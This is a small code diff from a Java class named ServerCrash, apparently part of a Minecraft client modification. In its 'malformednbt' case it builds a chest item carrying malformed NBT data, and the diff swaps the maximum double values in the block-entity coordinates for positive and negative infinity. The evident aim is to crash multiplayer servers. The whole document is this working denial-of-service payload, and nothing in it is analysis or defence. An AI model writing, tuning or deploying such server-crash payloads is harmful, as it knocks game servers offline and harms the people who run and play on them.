@@ -90,9 +90,9 @@ public class ServerCrash extends Command {
             case "malformednbt" -> {
                 ItemStack ez = new ItemStack(Items.CHEST, 1);
                 NbtCompound nbt = new NbtCompound();
-                nbt.put("x", NbtDouble.of(Double.MAX_VALUE));
+                nbt.put("x", NbtDouble.of(Double.POSITIVE_INFINITY));
                 nbt.put("y", NbtDouble.of(0.0d));
-                nbt.put("z", NbtDouble.of(Double.MAX_VALUE));
+                nbt.put("z", NbtDouble.of(Double.NEGATIVE_INFINITY));
                 NbtCompound fuck = new NbtCompound();
                 fuck.put("BlockEntityTag", nbt);
                 ez.setNbt(fuck);
